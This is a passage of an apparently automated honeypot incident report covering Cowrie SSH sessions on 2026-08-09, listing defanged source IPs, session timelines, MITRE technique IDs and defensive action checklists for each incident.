| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:00:28` | `cowrie.session.connect` |
| `2026-08-09 10:00:28` | `cowrie.client.version` |
| `2026-08-09 10:00:28` | `cowrie.client.kex` |
| `2026-08-09 10:00:29` | `cowrie.login.success` |
| `2026-08-09 10:00:30` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:00:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:00:30` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bcfcbf5b664

| Field | Detail |
|---|---|
| **Source IP** | `91.219.23[.]163` |
| **First Seen** | 2026-08-09 10:00 |
| **Last Seen** | 2026-08-09 10:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:00:31` | `cowrie.session.connect` |
| `2026-08-09 10:00:31` | `cowrie.client.version` |
| `2026-08-09 10:00:31` | `cowrie.client.kex` |
| `2026-08-09 10:00:31` | `cowrie.login.success` |
| `2026-08-09 10:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.219.23[.]163` to AbuseIPDB if not already reported
- [ ] Block `91.219.23[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26fb1ed4bc0d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-09 10:00 |
| **Last Seen** | 2026-08-09 10:00 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:00:32` | `cowrie.session.connect` |
| `2026-08-09 10:00:32` | `cowrie.client.version` |
| `2026-08-09 10:00:32` | `cowrie.client.kex` |
| `2026-08-09 10:00:33` | `cowrie.login.success` |
| `2026-08-09 10:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5755a2ce5e91

| Field | Detail |
|---|---|
| **Source IP** | `116.110.215[.]21` |
| **First Seen** | 2026-08-09 10:02 |
| **Last Seen** | 2026-08-09 10:03 |
| **Session Duration** | 89s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:02:23` | `cowrie.session.connect` |
| `2026-08-09 10:02:30` | `cowrie.client.version` |
| `2026-08-09 10:02:31` | `cowrie.client.kex` |
| `2026-08-09 10:02:54` | `cowrie.login.success` |
| `2026-08-09 10:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.215[.]21` to AbuseIPDB if not already reported
- [ ] Block `116.110.215[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9afccffa6e5e

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]49` |
| **First Seen** | 2026-08-09 10:04 |
| **Last Seen** | 2026-08-09 10:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:04:28` | `cowrie.session.connect` |
| `2026-08-09 10:04:28` | `cowrie.client.version` |
| `2026-08-09 10:04:28` | `cowrie.client.kex` |
| `2026-08-09 10:04:30` | `cowrie.login.success` |
| `2026-08-09 10:04:31` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]49` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d086065a691

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-09 10:04 |
| **Last Seen** | 2026-08-09 10:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:04:36` | `cowrie.session.connect` |
| `2026-08-09 10:04:37` | `cowrie.client.version` |
| `2026-08-09 10:04:37` | `cowrie.client.kex` |
| `2026-08-09 10:04:40` | `cowrie.login.success` |
| `2026-08-09 10:04:40` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d52e95484ed7

| Field | Detail |
|---|---|
| **Source IP** | `41.224.62[.]206` |
| **First Seen** | 2026-08-09 10:04 |
| **Last Seen** | 2026-08-09 10:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:04:46` | `cowrie.session.connect` |
| `2026-08-09 10:04:46` | `cowrie.client.version` |
| `2026-08-09 10:04:46` | `cowrie.client.kex` |
| `2026-08-09 10:04:47` | `cowrie.login.success` |
| `2026-08-09 10:04:47` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.224.62[.]206` to AbuseIPDB if not already reported
- [ ] Block `41.224.62[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d15b2b8ff082

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]175` |
| **First Seen** | 2026-08-09 10:05 |
| **Last Seen** | 2026-08-09 10:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:05:15` | `cowrie.session.connect` |
| `2026-08-09 10:05:15` | `cowrie.client.version` |
| `2026-08-09 10:05:16` | `cowrie.client.kex` |
| `2026-08-09 10:05:17` | `cowrie.login.success` |
| `2026-08-09 10:05:18` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:05:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:05:18` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edaf9825b6c0

| Field | Detail |
|---|---|
| **Source IP** | `116.110.215[.]21` |
| **First Seen** | 2026-08-09 10:06 |
| **Last Seen** | 2026-08-09 10:06 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:06:01` | `cowrie.session.connect` |
| `2026-08-09 10:06:01` | `cowrie.client.version` |
| `2026-08-09 10:06:01` | `cowrie.client.kex` |
| `2026-08-09 10:06:11` | `cowrie.login.success` |
| `2026-08-09 10:06:13` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:06:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:06:13` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.215[.]21` to AbuseIPDB if not already reported
- [ ] Block `116.110.215[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e1536e5ec0

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]175` |
| **First Seen** | 2026-08-09 10:08 |
| **Last Seen** | 2026-08-09 10:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:08:57` | `cowrie.session.connect` |
| `2026-08-09 10:08:57` | `cowrie.client.version` |
| `2026-08-09 10:08:58` | `cowrie.client.kex` |
| `2026-08-09 10:09:00` | `cowrie.login.success` |
| `2026-08-09 10:09:00` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:09:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:09:00` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cd94398a3e4

| Field | Detail |
|---|---|
| **Source IP** | `116.110.215[.]21` |
| **First Seen** | 2026-08-09 10:10 |
| **Last Seen** | 2026-08-09 10:10 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:10:37` | `cowrie.session.connect` |
| `2026-08-09 10:10:37` | `cowrie.client.version` |
| `2026-08-09 10:10:38` | `cowrie.client.kex` |
| `2026-08-09 10:10:44` | `cowrie.login.success` |
| `2026-08-09 10:10:45` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:10:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:10:45` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.215[.]21` to AbuseIPDB if not already reported
- [ ] Block `116.110.215[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa521d17f808

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-08-09 10:11 |
| **Last Seen** | 2026-08-09 10:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:11:29` | `cowrie.session.connect` |
| `2026-08-09 10:11:29` | `cowrie.client.version` |
| `2026-08-09 10:11:29` | `cowrie.client.kex` |
| `2026-08-09 10:11:31` | `cowrie.login.success` |
| `2026-08-09 10:11:32` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64fac52760dc

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:14 |
| **Last Seen** | 2026-08-09 10:14 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:14:42` | `cowrie.session.connect` |
| `2026-08-09 10:14:49` | `cowrie.login.success` |
| `2026-08-09 10:14:50` | `cowrie.session.params` |
| `2026-08-09 10:14:53` | `cowrie.log.closed` |
| `2026-08-09 10:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adef0f7c7799

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:14 |
| **Last Seen** | 2026-08-09 10:14 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:14:42` | `cowrie.session.connect` |
| `2026-08-09 10:14:48` | `cowrie.login.success` |
| `2026-08-09 10:14:49` | `cowrie.session.params` |
| `2026-08-09 10:14:53` | `cowrie.log.closed` |
| `2026-08-09 10:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4130e1176ae4

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:14 |
| **Last Seen** | 2026-08-09 10:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:14:53` | `cowrie.session.connect` |
| `2026-08-09 10:14:53` | `cowrie.login.success` |
| `2026-08-09 10:14:54` | `cowrie.session.params` |
| `2026-08-09 10:14:59` | `cowrie.log.closed` |
| `2026-08-09 10:14:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997ff3e6ff82

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:14 |
| **Last Seen** | 2026-08-09 10:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:14:53` | `cowrie.session.connect` |
| `2026-08-09 10:14:54` | `cowrie.login.success` |
| `2026-08-09 10:14:55` | `cowrie.session.params` |
| `2026-08-09 10:14:59` | `cowrie.log.closed` |
| `2026-08-09 10:14:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90475d94c8e1

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:14 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:14:59` | `cowrie.session.connect` |
| `2026-08-09 10:14:59` | `cowrie.login.success` |
| `2026-08-09 10:15:00` | `cowrie.session.params` |
| `2026-08-09 10:15:03` | `cowrie.log.closed` |
| `2026-08-09 10:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a694503acb

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:14 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:14:59` | `cowrie.session.connect` |
| `2026-08-09 10:15:00` | `cowrie.login.success` |
| `2026-08-09 10:15:00` | `cowrie.session.params` |
| `2026-08-09 10:15:03` | `cowrie.log.closed` |
| `2026-08-09 10:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f6eeddb0480

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:14 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:14:59` | `cowrie.session.connect` |
| `2026-08-09 10:15:00` | `cowrie.login.success` |
| `2026-08-09 10:15:01` | `cowrie.session.params` |
| `2026-08-09 10:15:04` | `cowrie.log.closed` |
| `2026-08-09 10:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2371a43cc6

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:15 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:15:04` | `cowrie.session.connect` |
| `2026-08-09 10:15:04` | `cowrie.login.success` |
| `2026-08-09 10:15:04` | `cowrie.session.params` |
| `2026-08-09 10:15:09` | `cowrie.log.closed` |
| `2026-08-09 10:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b77a90d2c9

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:15 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:15:04` | `cowrie.session.connect` |
| `2026-08-09 10:15:04` | `cowrie.login.success` |
| `2026-08-09 10:15:05` | `cowrie.session.params` |
| `2026-08-09 10:15:09` | `cowrie.log.closed` |
| `2026-08-09 10:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76acd0b240c

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:15 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:15:04` | `cowrie.session.connect` |
| `2026-08-09 10:15:05` | `cowrie.login.success` |
| `2026-08-09 10:15:06` | `cowrie.session.params` |
| `2026-08-09 10:15:09` | `cowrie.log.closed` |
| `2026-08-09 10:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf5290b2f47

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:15 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:15:09` | `cowrie.session.connect` |
| `2026-08-09 10:15:09` | `cowrie.login.success` |
| `2026-08-09 10:15:09` | `cowrie.session.params` |
| `2026-08-09 10:15:14` | `cowrie.log.closed` |
| `2026-08-09 10:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae986077aa92

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:15 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:15:09` | `cowrie.session.connect` |
| `2026-08-09 10:15:09` | `cowrie.login.success` |
| `2026-08-09 10:15:10` | `cowrie.session.params` |
| `2026-08-09 10:15:14` | `cowrie.log.closed` |
| `2026-08-09 10:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a219f8becbb

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:15 |
| **Last Seen** | 2026-08-09 10:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:15:52` | `cowrie.session.connect` |
| `2026-08-09 10:15:52` | `cowrie.login.success` |
| `2026-08-09 10:15:52` | `cowrie.session.params` |
| `2026-08-09 10:15:57` | `cowrie.log.closed` |
| `2026-08-09 10:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faa075681e03

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:15 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:15:57` | `cowrie.session.connect` |
| `2026-08-09 10:15:57` | `cowrie.login.success` |
| `2026-08-09 10:15:58` | `cowrie.session.params` |
| `2026-08-09 10:16:02` | `cowrie.log.closed` |
| `2026-08-09 10:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99b3e64c4e8d

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:15 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:15:58` | `cowrie.session.connect` |
| `2026-08-09 10:15:58` | `cowrie.login.success` |
| `2026-08-09 10:15:58` | `cowrie.session.params` |
| `2026-08-09 10:16:02` | `cowrie.log.closed` |
| `2026-08-09 10:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d60760e1cc80

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:16 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:16:02` | `cowrie.session.connect` |
| `2026-08-09 10:16:02` | `cowrie.login.success` |
| `2026-08-09 10:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38f211fa51b7

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:16 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:16:07` | `cowrie.session.connect` |
| `2026-08-09 10:16:07` | `cowrie.login.success` |
| `2026-08-09 10:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cdcfef35069

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:16 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:16:07` | `cowrie.session.connect` |
| `2026-08-09 10:16:07` | `cowrie.login.success` |
| `2026-08-09 10:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.102[.]191` to AbuseIPDB if not already reported
- [ ] Block `45.79.102[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83605ee6c678

| Field | Detail |
|---|---|
| **Source IP** | `45.79.102[.]191` |
| **First Seen** | 2026-08-09 10:16 |
| **Last Seen** | 2026-08-09 10:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
